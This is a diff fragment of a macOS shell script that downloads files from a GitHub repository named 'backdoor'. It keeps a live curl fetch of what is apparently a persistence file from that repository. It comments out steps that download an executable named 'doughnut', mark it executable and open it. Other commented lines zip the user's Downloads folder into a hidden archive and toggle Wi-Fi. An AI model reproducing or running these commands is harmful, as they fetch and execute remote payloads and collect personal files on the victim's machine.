@@ -5,10 +5,10 @@ curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfov
 # cd ..
 # cd ~/Downloads
 # zip -r ../.downloads.zip *
-cd ~/Desktop
-curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
-chmod +x doughnut
-open doughnut
+# cd ~/Desktop
+# curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
+# chmod +x doughnut
+# open doughnut
 # networksetup -setnetworkserviceenabled "Wi-Fi" off
 sleep 20
 # networksetup -setnetworkserviceenabled "Wi-Fi" on
